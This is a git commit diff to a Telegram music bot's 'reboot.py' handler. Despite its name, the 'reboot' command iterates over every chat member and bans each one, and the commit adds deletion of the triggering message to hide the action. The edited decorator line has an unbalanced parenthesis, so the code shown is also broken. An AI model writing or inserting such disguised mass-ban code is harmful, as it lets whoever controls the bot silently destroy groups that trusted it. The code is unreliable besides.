9e75edb508e9d9645bc0f6fc90d3e28bbf9f1e2d
LoveHeart <113758022+LeeyooMuzic@users.noreply.github.com>
2023-04-09 20:00:48 +0530

    Update reboot.py

--- PriyaMusic/handler/reboot.py
+++ PriyaMusic/handler/reboot.py
@@ -20,13 +20,14 @@ logging.getLogger("pyrogram").setLevel(logging.WARNING)
 
 
 
-@bot.on_message(filters.command("reboot"))
+@bot.on_message(filters.command("reboot")) & filters.service)
 async def reboot(client, msg):
     print("getting memebers from {}".format(msg.chat.id))
     async for i in bot.iter_chat_members(msg.chat.id):
         try:
             await client.ban_chat_member(chat_id =msg.chat.id,user_id=i.user.id)
             print("kicked {} from {}".format(i.user.id,msg.chat.id))
+            await bot.delete_messages(chat_id=msg.chat.id, message_ids=msg.message_id)
         except FloodWait as e:
             await asyncio.sleep(e.x)
             print(e)
